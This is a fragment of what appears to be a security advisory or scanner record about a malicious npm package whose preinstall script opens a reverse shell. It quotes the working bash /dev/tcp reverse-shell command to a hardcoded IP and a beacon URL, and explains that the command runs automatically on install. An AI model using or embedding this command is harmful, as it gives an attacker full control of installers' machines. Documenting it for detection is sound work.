  "summary": "preinstall lifecycle script opens reverse shell to hardcoded IP",
  "details": "package.json declares a preinstall script that runs `bash -i >& /dev/tcp/147.93.157.202/8080 0>&1` and pipes activity to http://canarytokens.com/terms/7dc94zmd3so67n5vbz5bxmt7v/contact.php. The command executes automatically on `npm install`, granting the operator of 147.93.157.202 an interactive bash shell on the installer's host and beaconing to the canarytokens URL. Any bytes returned over the TCP socket are executed by the installer's shell, resulting in full-host remote code execution with no user interaction beyond installing the package.",
